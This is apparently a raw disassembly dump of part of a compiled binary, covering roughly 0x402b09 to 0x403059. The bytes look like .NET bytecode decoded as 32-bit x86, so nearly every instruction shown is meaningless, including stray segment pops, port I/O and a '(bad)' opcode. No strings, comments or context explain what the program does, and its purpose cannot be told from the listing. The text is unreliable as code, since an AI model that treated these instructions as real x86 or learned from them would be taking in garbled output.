  402b09:	00 00                	add    %al,(%eax)
  402b0b:	0a 13                	or     (%ebx),%dl
  402b0d:	09 11                	or     %edx,(%ecx)
  402b0f:	09 17                	or     %edx,(%edi)
  402b11:	6f                   	outsl  %ds:(%esi),(%dx)
  402b12:	5b                   	pop    %ebx
  402b13:	00 00                	add    %al,(%eax)
  402b15:	0a 11                	or     (%ecx),%dl
  402b17:	09 72 30             	or     %esi,0x30(%edx)
  402b1a:	02 00                	add    (%eax),%al
  402b1c:	70 6f                	jo     0x402b8d
  402b1e:	5c                   	pop    %esp
  402b1f:	00 00                	add    %al,(%eax)
  402b21:	0a 11                	or     (%ecx),%dl
  402b23:	09 16                	or     %edx,(%esi)
  402b25:	6f                   	outsl  %ds:(%esi),(%dx)
  402b26:	5d                   	pop    %ebp
  402b27:	00 00                	add    %al,(%eax)
  402b29:	0a 11                	or     (%ecx),%dl
  402b2b:	09 09                	or     %ecx,(%ecx)
  402b2d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b2e:	56                   	push   %esi
  402b2f:	00 00                	add    %al,(%eax)
  402b31:	0a 11                	or     (%ecx),%dl
  402b33:	09 13                	or     %edx,(%ebx)
  402b35:	05 73 57 00 00       	add    $0x5773,%eax
  402b3a:	0a 13                	or     (%ebx),%dl
  402b3c:	06                   	push   %es
  402b3d:	11 06                	adc    %eax,(%esi)
  402b3f:	11 05 6f 58 00 00    	adc    %eax,0x586f
  402b45:	0a 07                	or     (%edi),%al
  402b47:	06                   	push   %es
  402b48:	28 0f                	sub    %cl,(%edi)
  402b4a:	00 00                	add    %al,(%eax)
  402b4c:	0a 2d 0a 08 11 04    	or     0x411080a,%ch
  402b52:	28 0f                	sub    %cl,(%edi)
  402b54:	00 00                	add    %al,(%eax)
  402b56:	0a 2c 7f             	or     (%edi,%edi,2),%ch
  402b59:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402b5c:	53                   	push   %ebx
  402b5d:	00 00                	add    %al,(%eax)
  402b5f:	0a 2d 30 07 11 04    	or     0x4110730,%ch
  402b65:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  402b69:	0a 11                	or     (%ecx),%dl
  402b6b:	05 28 5e 00 00       	add    $0x5e28,%eax
  402b70:	0a 26                	or     (%esi),%ah
  402b72:	17                   	pop    %ss
  402b73:	28 06                	sub    %al,(%esi)
  402b75:	00 00                	add    %al,(%eax)
  402b77:	0a de                	or     %dh,%bl
  402b79:	5e                   	pop    %esi
  402b7a:	13 07                	adc    (%edi),%eax
  402b7c:	11 07                	adc    %eax,(%edi)
  402b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  402b7f:	5f                   	pop    %edi
  402b80:	00 00                	add    %al,(%eax)
  402b82:	0a 20                	or     (%eax),%ah
  402b84:	c7 04 00 00 33 06 02 	movl   $0x2063300,(%eax,%eax,1)
  402b8b:	28 13                	sub    %dl,(%ebx)
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	06                   	push   %es
  402b90:	de 46 11             	fiadds 0x11(%esi)
  402b93:	04 28                	add    $0x28,%al
  402b95:	5a                   	pop    %edx
  402b96:	00 00                	add    %al,(%eax)
  402b98:	0a 20                	or     (%eax),%ah
  402b9a:	c8 00 00 00          	enter  $0x0,$0x0
  402b9e:	28 10                	sub    %dl,(%eax)
  402ba0:	00 00                	add    %al,(%eax)
  402ba2:	0a 07                	or     (%edi),%al
  402ba4:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402ba7:	54                   	push   %esp
  402ba8:	00 00                	add    %al,(%eax)
  402baa:	0a de                	or     %dh,%bl
  402bac:	03 26                	add    (%esi),%esp
  402bae:	de 00                	fiadds (%eax)
  402bb0:	11 05 28 5e 00 00    	adc    %eax,0x5e28
  402bb6:	0a 26                	or     (%esi),%ah
  402bb8:	17                   	pop    %ss
  402bb9:	28 06                	sub    %al,(%esi)
  402bbb:	00 00                	add    %al,(%eax)
  402bbd:	0a de                	or     %dh,%bl
  402bbf:	18 13                	sbb    %dl,(%ebx)
  402bc1:	08 11                	or     %dl,(%ecx)
  402bc3:	08 6f 5f             	or     %ch,0x5f(%edi)
  402bc6:	00 00                	add    %al,(%eax)
  402bc8:	0a 20                	or     (%eax),%ah
  402bca:	c7 04 00 00 33 06 02 	movl   $0x2063300,(%eax,%eax,1)
  402bd1:	28 13                	sub    %dl,(%ebx)
  402bd3:	00 00                	add    %al,(%eax)
  402bd5:	06                   	push   %es
  402bd6:	de 00                	fiadds (%eax)
  402bd8:	2a 00                	sub    (%eax),%al
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	01 28                	add    %ebp,(%eax)
  402bde:	00 00                	add    %al,(%eax)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	aa                   	stos   %al,%es:(%edi)
  402be3:	00 10                	add    %dl,(%eax)
  402be5:	ba 00 18 37 00       	mov    $0x371800,%edx
  402bea:	00 01                	add    %al,(%ecx)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	d2 00                	rolb   %cl,(%eax)
  402bf0:	1b ed                	sbb    %ebp,%ebp
  402bf2:	00 03                	add    %al,(%ebx)
  402bf4:	01 00                	add    %eax,(%eax)
  402bf6:	00 01                	add    %al,(%ecx)
  402bf8:	00 00                	add    %al,(%eax)
  402bfa:	f0 00 10             	lock add %dl,(%eax)
  402bfd:	00 01                	add    %al,(%ecx)
  402bff:	18 37                	sbb    %dh,(%edi)
  402c01:	00 00                	add    %al,(%eax)
  402c03:	01 1b                	add    %ebx,(%ebx)
  402c05:	30 04 00             	xor    %al,(%eax,%eax,1)
  402c08:	86 00                	xchg   %al,(%eax)
  402c0a:	00 00                	add    %al,(%eax)
  402c0c:	10 00                	adc    %al,(%eax)
  402c0e:	00 11                	add    %dl,(%ecx)
  402c10:	1d 28 0e 00 00       	sbb    $0xe28,%eax
  402c15:	0a 0a                	or     (%edx),%cl
  402c17:	28 12                	sub    %dl,(%edx)
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	0a 6f 60             	or     0x60(%edi),%ch
  402c1e:	00 00                	add    %al,(%eax)
  402c20:	0a 0b                	or     (%ebx),%cl
  402c22:	06                   	push   %es
  402c23:	72 2c                	jb     0x402c51
  402c25:	02 00                	add    (%eax),%al
  402c27:	70 07                	jo     0x402c30
  402c29:	72 3c                	jb     0x402c67
  402c2b:	02 00                	add    (%eax),%al
  402c2d:	70 28                	jo     0x402c57
  402c2f:	4a                   	dec    %edx
  402c30:	00 00                	add    %al,(%eax)
  402c32:	0a 73 61             	or     0x61(%ebx),%dh
  402c35:	00 00                	add    %al,(%eax)
  402c37:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  402c3a:	16                   	push   %ss
  402c3b:	00 00                	add    %al,(%eax)
  402c3d:	0a 6f 0c             	or     0xc(%edi),%ch
  402c40:	00 00                	add    %al,(%eax)
  402c42:	0a 0d 08 72 46 02    	or     0x2467208,%cl
  402c48:	00 70 6f             	add    %dh,0x6f(%eax)
  402c4b:	62 00                	bound  %eax,(%eax)
  402c4d:	00 0a                	add    %cl,(%edx)
  402c4f:	08 72 6c             	or     %dh,0x6c(%edx)
  402c52:	02 00                	add    (%eax),%al
  402c54:	70 09                	jo     0x402c5f
  402c56:	28 52 00             	sub    %dl,0x0(%edx)
  402c59:	00 0a                	add    %cl,(%edx)
  402c5b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c5c:	62 00                	bound  %eax,(%eax)
  402c5e:	00 0a                	add    %cl,(%edx)
  402c60:	08 72 86             	or     %dh,-0x7a(%edx)
  402c63:	02 00                	add    (%eax),%al
  402c65:	70 6f                	jo     0x402cd6
  402c67:	62 00                	bound  %eax,(%eax)
  402c69:	00 0a                	add    %cl,(%edx)
  402c6b:	09 1f                	or     %ebx,(%edi)
  402c6d:	5c                   	pop    %esp
  402c6e:	1f                   	pop    %ds
  402c6f:	2f                   	das
  402c70:	6f                   	outsl  %ds:(%esi),(%dx)
  402c71:	63 00                	arpl   %eax,(%eax)
  402c73:	00 0a                	add    %cl,(%edx)
  402c75:	13 04 08             	adc    (%eax,%ecx,1),%eax
  402c78:	72 9e                	jb     0x402c18
  402c7a:	02 00                	add    (%eax),%al
  402c7c:	70 11                	jo     0x402c8f
  402c7e:	04 28                	add    $0x28,%al
  402c80:	52                   	push   %edx
  402c81:	00 00                	add    %al,(%eax)
  402c83:	0a 6f 62             	or     0x62(%edi),%ch
  402c86:	00 00                	add    %al,(%eax)
  402c88:	0a de                	or     %dh,%bl
  402c8a:	0a 08                	or     (%eax),%cl
  402c8c:	2c 06                	sub    $0x6,%al
  402c8e:	08 6f 47             	or     %ch,0x47(%edi)
  402c91:	00 00                	add    %al,(%eax)
  402c93:	0a dc                	or     %ah,%bl
  402c95:	2a 00                	sub    (%eax),%al
  402c97:	00 01                	add    %al,(%ecx)
  402c99:	10 00                	adc    %al,(%eax)
  402c9b:	00 02                	add    %al,(%edx)
  402c9d:	00 29                	add    %ch,(%ecx)
  402c9f:	00 52 7b             	add    %dl,0x7b(%edx)
  402ca2:	00 0a                	add    %cl,(%edx)
  402ca4:	00 00                	add    %al,(%eax)
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	1b 30                	sbb    (%eax),%esi
  402caa:	03 00                	add    (%eax),%eax
  402cac:	39 00                	cmp    %eax,(%eax)
  402cae:	00 00                	add    %al,(%eax)
  402cb0:	11 00                	adc    %eax,(%eax)
  402cb2:	00 11                	add    %dl,(%ecx)
  402cb4:	1f                   	pop    %ds
  402cb5:	1a 28                	sbb    (%eax),%ch
  402cb7:	0e                   	push   %cs
  402cb8:	00 00                	add    %al,(%eax)
  402cba:	0a 72 2c             	or     0x2c(%edx),%dh
  402cbd:	02 00                	add    (%eax),%al
  402cbf:	70 7e                	jo     0x402d3f
  402cc1:	10 00                	adc    %al,(%eax)
  402cc3:	00 04 28             	add    %al,(%eax,%ebp,1)
  402cc6:	31 00                	xor    %eax,(%eax)
  402cc8:	00 0a                	add    %cl,(%edx)
  402cca:	0a 06                	or     (%esi),%al
  402ccc:	7e 1a                	jle    0x402ce8
  402cce:	00 00                	add    %al,(%eax)
  402cd0:	04 28                	add    $0x28,%al
  402cd2:	34 00                	xor    $0x0,%al
  402cd4:	00 0a                	add    %cl,(%edx)
  402cd6:	20 f4                	and    %dh,%ah
  402cd8:	01 00                	add    %eax,(%eax)
  402cda:	00 28                	add    %ch,(%eax)
  402cdc:	10 00                	adc    %al,(%eax)
  402cde:	00 0a                	add    %cl,(%edx)
  402ce0:	06                   	push   %es
  402ce1:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  402ce5:	0a 26                	or     (%esi),%ah
  402ce7:	de 03                	fiadds (%ebx)
  402ce9:	26 de 00             	fiadds %es:(%eax)
  402cec:	2a 00                	sub    (%eax),%al
  402cee:	00 00                	add    %al,(%eax)
  402cf0:	01 10                	add    %edx,(%eax)
  402cf2:	00 00                	add    %al,(%eax)
  402cf4:	00 00                	add    %al,(%eax)
  402cf6:	17                   	pop    %ss
  402cf7:	00 1e                	add    %bl,(%esi)
  402cf9:	35 00 03 01 00       	xor    $0x10300,%eax
  402cfe:	00 01                	add    %al,(%ecx)
  402d00:	1b 30                	sbb    (%eax),%esi
  402d02:	03 00                	add    (%eax),%eax
  402d04:	2c 00                	sub    $0x0,%al
  402d06:	00 00                	add    %al,(%eax)
  402d08:	12 00                	adc    (%eax),%al
  402d0a:	00 11                	add    %dl,(%ecx)
  402d0c:	7e 65                	jle    0x402d73
  402d0e:	00 00                	add    %al,(%eax)
  402d10:	0a 72 b2             	or     -0x4e(%edx),%dh
  402d13:	02 00                	add    (%eax),%al
  402d15:	70 17                	jo     0x402d2e
  402d17:	6f                   	outsl  %ds:(%esi),(%dx)
  402d18:	66 00 00             	data16 add %al,(%eax)
  402d1b:	0a 0a                	or     (%edx),%cl
  402d1d:	06                   	push   %es
  402d1e:	72 0e                	jb     0x402d2e
  402d20:	03 00                	add    (%eax),%eax
  402d22:	70 28                	jo     0x402d4c
  402d24:	16                   	push   %ss
  402d25:	00 00                	add    %al,(%eax)
  402d27:	0a 6f 0c             	or     0xc(%edi),%ch
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	0a 6f 67             	or     0x67(%edi),%ch
  402d2f:	00 00                	add    %al,(%eax)
  402d31:	0a de                	or     %dh,%bl
  402d33:	03 26                	add    (%esi),%esp
  402d35:	de 00                	fiadds (%eax)
  402d37:	2a 01                	sub    (%ecx),%al
  402d39:	10 00                	adc    %al,(%eax)
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	00 00                	add    %al,(%eax)
  402d3f:	00 28                	add    %ch,(%eax)
  402d41:	28 00                	sub    %al,(%eax)
  402d43:	03 01                	add    (%ecx),%eax
  402d45:	00 00                	add    %al,(%eax)
  402d47:	01 1b                	add    %ebx,(%ebx)
  402d49:	30 03                	xor    %al,(%ebx)
  402d4b:	00 5e 00             	add    %bl,0x0(%esi)
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	13 00                	adc    (%eax),%eax
  402d52:	00 11                	add    %dl,(%ecx)
  402d54:	28 4f 00             	sub    %cl,0x0(%edi)
  402d57:	00 0a                	add    %cl,(%edx)
  402d59:	0b 16                	or     (%esi),%edx
  402d5b:	0c 2b                	or     $0x2b,%al
  402d5d:	4d                   	dec    %ebp
  402d5e:	07                   	pop    %es
  402d5f:	08 9a 0a 06 6f 20    	or     %bl,0x206f060a(%edx)
  402d65:	00 00                	add    %al,(%eax)
  402d67:	0a 72 3a             	or     0x3a(%edx),%dh
  402d6a:	01 00                	add    %eax,(%eax)
  402d6c:	70 28                	jo     0x402d96
  402d6e:	0f 00 00             	sldt   (%eax)
  402d71:	0a 2c 33             	or     (%ebx,%esi,1),%ch
  402d74:	06                   	push   %es
  402d75:	6f                   	outsl  %ds:(%esi),(%dx)
  402d76:	20 00                	and    %al,(%eax)
  402d78:	00 0a                	add    %cl,(%edx)
  402d7a:	02 28                	add    (%eax),%ch
  402d7c:	52                   	push   %edx
  402d7d:	00 00                	add    %al,(%eax)
  402d7f:	0a 28                	or     (%eax),%ch
  402d81:	53                   	push   %ebx
  402d82:	00 00                	add    %al,(%eax)
  402d84:	0a 2d 20 28 16 00    	or     0x162820,%ch
  402d8a:	00 0a                	add    %cl,(%edx)
  402d8c:	6f                   	outsl  %ds:(%esi),(%dx)
  402d8d:	0c 00                	or     $0x0,%al
  402d8f:	00 0a                	add    %cl,(%edx)
  402d91:	06                   	push   %es
  402d92:	6f                   	outsl  %ds:(%esi),(%dx)
  402d93:	20 00                	and    %al,(%eax)
  402d95:	00 0a                	add    %cl,(%edx)
  402d97:	02 28                	add    (%eax),%ch
  402d99:	52                   	push   %edx
  402d9a:	00 00                	add    %al,(%eax)
  402d9c:	0a 28                	or     (%eax),%ch
  402d9e:	54                   	push   %esp
  402d9f:	00 00                	add    %al,(%eax)
  402da1:	0a de                	or     %dh,%bl
  402da3:	03 26                	add    (%esi),%esp
  402da5:	de 00                	fiadds (%eax)
  402da7:	08 17                	or     %dl,(%edi)
  402da9:	58                   	pop    %eax
  402daa:	0c 08                	or     $0x8,%al
  402dac:	07                   	pop    %es
  402dad:	8e 69 32             	mov    0x32(%ecx),%gs
  402db0:	ad                   	lods   %ds:(%esi),%eax
  402db1:	2a 00                	sub    (%eax),%al
  402db3:	00 01                	add    %al,(%ecx)
  402db5:	10 00                	adc    %al,(%eax)
  402db7:	00 00                	add    %al,(%eax)
  402db9:	00 33                	add    %dh,(%ebx)
  402dbb:	00 1d 50 00 03 01    	add    %bl,0x1030050
  402dc1:	00 00                	add    %al,(%eax)
  402dc3:	01 13                	add    %edx,(%ebx)
  402dc5:	30 03                	xor    %al,(%ebx)
  402dc7:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  402dcb:	00 14 00             	add    %dl,(%eax,%eax,1)
  402dce:	00 11                	add    %dl,(%ecx)
  402dd0:	73 57                	jae    0x402e29
  402dd2:	00 00                	add    %al,(%eax)
  402dd4:	0a 0a                	or     (%edx),%cl
  402dd6:	73 68                	jae    0x402e40
  402dd8:	00 00                	add    %al,(%eax)
  402dda:	0a 0b                	or     (%ebx),%cl
  402ddc:	07                   	pop    %es
  402ddd:	72 2e                	jb     0x402e0d
  402ddf:	03 00                	add    (%eax),%eax
  402de1:	70 6f                	jo     0x402e52
  402de3:	69 00 00 0a 07 72    	imul   $0x72070a00,(%eax),%eax
  402de9:	3e 03 00             	add    %ds:(%eax),%eax
  402dec:	70 02                	jo     0x402df0
  402dee:	28 52 00             	sub    %dl,0x0(%edx)
  402df1:	00 0a                	add    %cl,(%edx)
  402df3:	6f                   	outsl  %ds:(%esi),(%dx)
  402df4:	6a 00                	push   $0x0
  402df6:	00 0a                	add    %cl,(%edx)
  402df8:	07                   	pop    %es
  402df9:	17                   	pop    %ss
  402dfa:	6f                   	outsl  %ds:(%esi),(%dx)
  402dfb:	5d                   	pop    %ebp
  402dfc:	00 00                	add    %al,(%eax)
  402dfe:	0a 06                	or     (%esi),%al
  402e00:	07                   	pop    %es
  402e01:	6f                   	outsl  %ds:(%esi),(%dx)
  402e02:	58                   	pop    %eax
  402e03:	00 00                	add    %al,(%eax)
  402e05:	0a 06                	or     (%esi),%al
  402e07:	6f                   	outsl  %ds:(%esi),(%dx)
  402e08:	59                   	pop    %ecx
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	0a 26                	or     (%esi),%ah
  402e0d:	06                   	push   %es
  402e0e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e0f:	6b 00 00             	imul   $0x0,(%eax),%eax
  402e12:	0a 2a                	or     (%edx),%ch
  402e14:	2e 72 46             	jb,pn  0x402e5d
  402e17:	03 00                	add    (%eax),%eax
  402e19:	70 28                	jo     0x402e43
  402e1b:	18 00                	sbb    %al,(%eax)
  402e1d:	00 06                	add    %al,(%esi)
  402e1f:	2a 2e                	sub    (%esi),%ch
  402e21:	72 c0                	jb     0x402de3
  402e23:	03 00                	add    (%eax),%eax
  402e25:	70 28                	jo     0x402e4f
  402e27:	18 00                	sbb    %al,(%eax)
  402e29:	00 06                	add    %al,(%esi)
  402e2b:	2a 2e                	sub    (%esi),%ch
  402e2d:	72 8d                	jb     0x402dbc
  402e2f:	04 00                	add    $0x0,%al
  402e31:	70 28                	jo     0x402e5b
  402e33:	18 00                	sbb    %al,(%eax)
  402e35:	00 06                	add    %al,(%esi)
  402e37:	2a 1b                	sub    (%ebx),%bl
  402e39:	30 04 00             	xor    %al,(%eax,%eax,1)
  402e3c:	41                   	inc    %ecx
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	00 11                	add    %dl,(%ecx)
  402e41:	00 00                	add    %al,(%eax)
  402e43:	11 02                	adc    %eax,(%edx)
  402e45:	72 4b                	jb     0x402e92
  402e47:	00 00                	add    %al,(%eax)
  402e49:	70 28                	jo     0x402e73
  402e4b:	0f 00 00             	sldt   (%eax)
  402e4e:	0a 2c 33             	or     (%ebx,%esi,1),%ch
  402e51:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402e55:	0a 1f                	or     (%edi),%bl
  402e57:	09 28                	or     %ebp,(%eax)
  402e59:	07                   	pop    %es
  402e5a:	00 00                	add    %al,(%eax)
  402e5c:	06                   	push   %es
  402e5d:	72 c9                	jb     0x402e28
  402e5f:	04 00                	add    $0x0,%al
  402e61:	70 28                	jo     0x402e8b
  402e63:	31 00                	xor    %eax,(%eax)
  402e65:	00 0a                	add    %cl,(%edx)
  402e67:	0a 06                	or     (%esi),%al
  402e69:	02 28                	add    (%eax),%ch
  402e6b:	6d                   	insl   (%dx),%es:(%edi)
  402e6c:	00 00                	add    %al,(%eax)
  402e6e:	0a 28                	or     (%eax),%ch
  402e70:	6e                   	outsb  %ds:(%esi),(%dx)
  402e71:	00 00                	add    %al,(%eax)
  402e73:	0a 1f                	or     (%edi),%bl
  402e75:	14 16                	adc    $0x16,%al
  402e77:	06                   	push   %es
  402e78:	19 28                	sbb    %ebp,(%eax)
  402e7a:	01 00                	add    %eax,(%eax)
  402e7c:	00 06                	add    %al,(%esi)
  402e7e:	26 de 03             	fiadds %es:(%ebx)
  402e81:	26 de 00             	fiadds %es:(%eax)
  402e84:	2a 00                	sub    (%eax),%al
  402e86:	00 00                	add    %al,(%eax)
  402e88:	01 10                	add    %edx,(%eax)
  402e8a:	00 00                	add    %al,(%eax)
  402e8c:	00 00                	add    %al,(%eax)
  402e8e:	0d 00 30 3d 00       	or     $0x3d3000,%eax
  402e93:	03 01                	add    (%ecx),%eax
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 13                	add    %edx,(%ebx)
  402e99:	30 03                	xor    %al,(%ebx)
  402e9b:	00 75 0a             	add    %dh,0xa(%ebp)
  402e9e:	00 00                	add    %al,(%eax)
  402ea0:	15 00 00 11 28       	adc    $0x28110000,%eax
  402ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  402eae:	72 d3                	jb     0x402e83
  402eb0:	04 00                	add    $0x0,%al
  402eb2:	70 80                	jo     0x402e34
  402eb4:	02 00                	add    (%eax),%al
  402eb6:	00 04 72             	add    %al,(%edx,%esi,2)
  402eb9:	e7 04                	out    %eax,$0x4
  402ebb:	00 70 80             	add    %dh,-0x80(%eax)
  402ebe:	03 00                	add    (%eax),%eax
  402ec0:	00 04 16             	add    %al,(%esi,%edx,1)
  402ec3:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  402ec7:	04 72                	add    $0x72,%al
  402ec9:	4b                   	dec    %ebx
  402eca:	00 00                	add    %al,(%eax)
  402ecc:	70 80                	jo     0x402e4e
  402ece:	05 00 00 04 17       	add    $0x17040000,%eax
  402ed3:	80 06 00             	addb   $0x0,(%esi)
  402ed6:	00 04 72             	add    %al,(%edx,%esi,2)
  402ed9:	13 05 00 70 80 07    	adc    0x7807000,%eax
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	04 17                	add    $0x17,%al
  402ee3:	80 08 00             	orb    $0x0,(%eax)
  402ee6:	00 04 72             	add    %al,(%edx,%esi,2)
  402ee9:	2d 05 00 70 80       	sub    $0x80700005,%eax
  402eee:	09 00                	or     %eax,(%eax)
  402ef0:	00 04 72             	add    %al,(%edx,%esi,2)
  402ef3:	45                   	inc    %ebp
  402ef4:	05 00 70 80 0a       	add    $0xa807000,%eax
  402ef9:	00 00                	add    %al,(%eax)
  402efb:	04 17                	add    $0x17,%al
  402efd:	80 0b 00             	orb    $0x0,(%ebx)
  402f00:	00 04 16             	add    %al,(%esi,%edx,1)
  402f03:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  402f07:	04 1f                	add    $0x1f,%al
  402f09:	0a 80 0d 00 00 04    	or     0x400000d(%eax),%al
  402f0f:	72 6d                	jb     0x402f7e
  402f11:	05 00 70 80 0e       	add    $0xe807000,%eax
  402f16:	00 00                	add    %al,(%eax)
  402f18:	04 72                	add    $0x72,%al
  402f1a:	87 05 00 70 80 0f    	xchg   %eax,0xf807000
  402f20:	00 00                	add    %al,(%eax)
  402f22:	04 72                	add    $0x72,%al
  402f24:	af                   	scas   %es:(%edi),%eax
  402f25:	05 00 70 80 10       	add    $0x10807000,%eax
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	04 16                	add    $0x16,%al
  402f2e:	80 11 00             	adcb   $0x0,(%ecx)
  402f31:	00 04 16             	add    %al,(%esi,%edx,1)
  402f34:	80 12 00             	adcb   $0x0,(%edx)
  402f37:	00 04 16             	add    %al,(%esi,%edx,1)
  402f3a:	80 13 00             	adcb   $0x0,(%ebx)
  402f3d:	00 04 16             	add    %al,(%esi,%edx,1)
  402f40:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  402f44:	04 72                	add    $0x72,%al
  402f46:	c7 05 00 70 80 15 00 	movl   $0x7e040000,0x15807000
  402f4d:	00 04 7e 
  402f50:	15 00 00 04 7e       	adc    $0x7e040000,%eax
  402f55:	0a 00                	or     (%eax),%al
  402f57:	00 04 28             	add    %al,(%eax,%ebp,1)
  402f5a:	52                   	push   %edx
  402f5b:	00 00                	add    %al,(%eax)
  402f5d:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  402f63:	72 e7                	jb     0x402f4c
  402f65:	05 00 70 80 17       	add    $0x17807000,%eax
  402f6a:	00 00                	add    %al,(%eax)
  402f6c:	04 7e                	add    $0x7e,%al
  402f6e:	17                   	pop    %ss
  402f6f:	00 00                	add    %al,(%eax)
  402f71:	04 7e                	add    $0x7e,%al
  402f73:	0f 00 00             	sldt   (%eax)
  402f76:	04 7e                	add    $0x7e,%al
  402f78:	03 00                	add    (%eax),%eax
  402f7a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402f7d:	31 00                	xor    %eax,(%eax)
  402f7f:	00 0a                	add    %cl,(%edx)
  402f81:	80 18 00             	sbbb   $0x0,(%eax)
  402f84:	00 04 72             	add    %al,(%edx,%esi,2)
  402f87:	ed                   	in     (%dx),%eax
  402f88:	05 00 70 73 70       	add    $0x70737000,%eax
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  402f95:	1b 8d 14 00 00 01    	sbb    0x1000014(%ebp),%ecx
  402f9b:	0a 06                	or     (%esi),%al
  402f9d:	16                   	push   %ss
  402f9e:	72 61                	jb     0x403001
  402fa0:	06                   	push   %es
  402fa1:	00 70 a2             	add    %dh,-0x5e(%eax)
  402fa4:	06                   	push   %es
  402fa5:	17                   	pop    %ss
  402fa6:	72 4b                	jb     0x402ff3
  402fa8:	00 00                	add    %al,(%eax)
  402faa:	70 a2                	jo     0x402f4e
  402fac:	06                   	push   %es
  402fad:	18 72 69             	sbb    %dh,0x69(%edx)
  402fb0:	06                   	push   %es
  402fb1:	00 70 a2             	add    %dh,-0x5e(%eax)
  402fb4:	06                   	push   %es
  402fb5:	19 72 cb             	sbb    %esi,-0x35(%edx)
  402fb8:	06                   	push   %es
  402fb9:	00 70 a2             	add    %dh,-0x5e(%eax)
  402fbc:	06                   	push   %es
  402fbd:	1a 72 21             	sbb    0x21(%edx),%dh
  402fc0:	07                   	pop    %es
  402fc1:	00 70 a2             	add    %dh,-0x5e(%eax)
  402fc4:	06                   	push   %es
  402fc5:	80 1a 00             	sbbb   $0x0,(%edx)
  402fc8:	00 04 20             	add    %al,(%eax,%eiz,1)
  402fcb:	e5 00                	in     $0x0,%eax
  402fcd:	00 00                	add    %al,(%eax)
  402fcf:	8d 14 00             	lea    (%eax,%eax,1),%edx
  402fd2:	00 01                	add    %al,(%ecx)
  402fd4:	0b 07                	or     (%edi),%eax
  402fd6:	16                   	push   %ss
  402fd7:	72 71                	jb     0x40304a
  402fd9:	07                   	pop    %es
  402fda:	00 70 a2             	add    %dh,-0x5e(%eax)
  402fdd:	07                   	pop    %es
  402fde:	17                   	pop    %ss
  402fdf:	72 7b                	jb     0x40305c
  402fe1:	07                   	pop    %es
  402fe2:	00 70 a2             	add    %dh,-0x5e(%eax)
  402fe5:	07                   	pop    %es
  402fe6:	18 72 85             	sbb    %dh,-0x7b(%edx)
  402fe9:	07                   	pop    %es
  402fea:	00 70 a2             	add    %dh,-0x5e(%eax)
  402fed:	07                   	pop    %es
  402fee:	19 72 8f             	sbb    %esi,-0x71(%edx)
  402ff1:	07                   	pop    %es
  402ff2:	00 70 a2             	add    %dh,-0x5e(%eax)
  402ff5:	07                   	pop    %es
  402ff6:	1a 72 a1             	sbb    -0x5f(%edx),%dh
  402ff9:	07                   	pop    %es
  402ffa:	00 70 a2             	add    %dh,-0x5e(%eax)
  402ffd:	07                   	pop    %es
  402ffe:	1b 72 b5             	sbb    -0x4b(%edx),%esi
  403001:	07                   	pop    %es
  403002:	00 70 a2             	add    %dh,-0x5e(%eax)
  403005:	07                   	pop    %es
  403006:	1c 72                	sbb    $0x72,%al
  403008:	bf 07 00 70 a2       	mov    $0xa2700007,%edi
  40300d:	07                   	pop    %es
  40300e:	1d 72 cb 07 00       	sbb    $0x7cb72,%eax
  403013:	70 a2                	jo     0x402fb7
  403015:	07                   	pop    %es
  403016:	1e                   	push   %ds
  403017:	72 d5                	jb     0x402fee
  403019:	07                   	pop    %es
  40301a:	00 70 a2             	add    %dh,-0x5e(%eax)
  40301d:	07                   	pop    %es
  40301e:	1f                   	pop    %ds
  40301f:	09 72 e1             	or     %esi,-0x1f(%edx)
  403022:	07                   	pop    %es
  403023:	00 70 a2             	add    %dh,-0x5e(%eax)
  403026:	07                   	pop    %es
  403027:	1f                   	pop    %ds
  403028:	0a 72 eb             	or     -0x15(%edx),%dh
  40302b:	07                   	pop    %es
  40302c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40302f:	07                   	pop    %es
  403030:	1f                   	pop    %ds
  403031:	0b 72 f7             	or     -0x9(%edx),%esi
  403034:	07                   	pop    %es
  403035:	00 70 a2             	add    %dh,-0x5e(%eax)
  403038:	07                   	pop    %es
  403039:	1f                   	pop    %ds
  40303a:	0c 72                	or     $0x72,%al
  40303c:	c9                   	leave
  40303d:	04 00                	add    $0x0,%al
  40303f:	70 a2                	jo     0x402fe3
  403041:	07                   	pop    %es
  403042:	1f                   	pop    %ds
  403043:	0d 72 01 08 00       	or     $0x80172,%eax
  403048:	70 a2                	jo     0x402fec
  40304a:	07                   	pop    %es
  40304b:	1f                   	pop    %ds
  40304c:	0e                   	push   %cs
  40304d:	72 0b                	jb     0x40305a
  40304f:	08 00                	or     %al,(%eax)
  403051:	70 a2                	jo     0x402ff5
  403053:	07                   	pop    %es
  403054:	1f                   	pop    %ds
  403055:	0f 72                	(bad)
  403057:	19 08                	sbb    %ecx,(%eax)
  403059:	00 70 a2             	add    %dh,-0x5e(%eax)
